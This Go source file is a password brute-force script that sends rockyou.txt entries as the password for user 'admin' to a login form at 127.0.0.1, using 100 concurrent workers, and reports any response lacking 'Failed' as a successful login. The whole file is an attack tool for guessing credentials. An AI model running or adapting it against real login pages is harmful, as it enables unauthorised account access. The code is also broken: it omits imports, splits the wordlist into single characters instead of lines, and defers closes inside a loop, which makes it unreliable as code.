package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"sync"
	"time"
)

const (
	URL    = "http://127.0.0.1:8000/login.html"
	MaxCon = 100 // maximum number of concurrent requests
)

func main() {
	startTime := time.Now()

	// create a wait group for synchronization
	var wg sync.WaitGroup

	// create a buffered channel to hold the passwords to be tested
	passwords := make(chan string, 1000)

	// read the passwords from the file and send them to the channel
	go func() {
		file, err := os.Open("rockyou.txt")
		if err != nil {
			fmt.Println("Error opening file:", err)
			return
		}
		defer file.Close()

		data, err := ioutil.ReadAll(file)
		if err != nil {
			fmt.Println("Error reading file:", err)
			return
		}

		passwordsSlice := []byte(data)
		passwordsStr := string(passwordsSlice)
		for _, p := range passwordsStr {
			passwords <- string(p)
		}
		close(passwords)
	}()

	// create a buffered channel to hold the results
	results := make(chan string, 1000)

	// create a pool of workers to handle the requests
	for i := 0; i < MaxCon; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for p := range passwords {
				// build the request payload
				payload := fmt.Sprintf("uname=admin&pword=%s", p)
				body := []byte(payload)

				// create a new HTTP request
				req, err := http.NewRequest("POST", URL, ioutil.NopCloser(bytes.NewReader(body)))
				if err != nil {
					fmt.Println("Error creating request:", err)
					return
				}
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

				// execute the request
				resp, err := http.DefaultClient.Do(req)
				if err != nil {
					fmt.Println("Error executing request:", err)
					return
				}
				defer resp.Body.Close()

				// read the response body
				respBody, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println("Error reading response body:", err)
					return
				}

				// check if the login was successful
				if !strings.Contains(string(respBody), "Failed") {
					results <- p
				}
			}
		}()
	}

	// wait for all workers to finish
	wg.Wait()

	// close the results channel
	close(results)

	// print the results
	for p := range results {
		fmt.Printf("Login Successful\nUsername:Password is admin:%s\n", p)
	}

	fmt.Println("Done")
	fmt.Printf("Elapsed time: %s\n", time.Since(startTime))
}
